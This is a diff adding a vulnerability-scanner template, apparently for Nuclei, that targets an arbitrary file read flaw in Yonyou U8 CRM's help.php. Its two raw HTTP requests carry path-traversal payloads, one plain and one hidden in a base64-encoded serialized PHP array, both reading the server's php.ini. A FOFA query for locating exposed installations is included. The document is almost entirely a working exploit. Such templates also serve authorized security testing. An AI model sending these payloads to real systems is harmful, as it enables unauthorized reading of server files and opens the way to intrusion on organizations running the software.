@@ -1,0 +1,33 @@
+id: yonyou-crm-help-fileread
+
+info:
+  name: 用友crm-help.php-任意文件读取漏洞
+  author: xx
+  severity: high
+  description: 用友crm-help.php-任意文件读取漏洞
+  metadata:
+    fofa-query: app="用友U8CRM"
+  tags: yonyou,fileread
+
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /pub/help2.php?key=../../apache/php.ini HTTP/1.1
+    Host: {{Hostname}}
+
+  - |+
+    @timeout: 30s
+    GET /pub/help.php?key=YTozOntpOjA7czoyNDoiLy4uLy4uLy4uL2FwYWNoZS9waHAuaW5pIjtpOjE7czoxOiIxIjtpOjI7czoxOiIyIjt9 HTTP/1.1
+    Host: {{Hostname}}
+  
+  max-redirects: 3
+  matchers-condition: or
+  matchers:
+    - type: dsl
+      dsl:
+        - 'status_code_1 == 200 && contains(body_1, "php.ini")'
+    - type: dsl
+      dsl:
+        - 'status_code_2 == 200 && contains(body_2, "php.ini")'
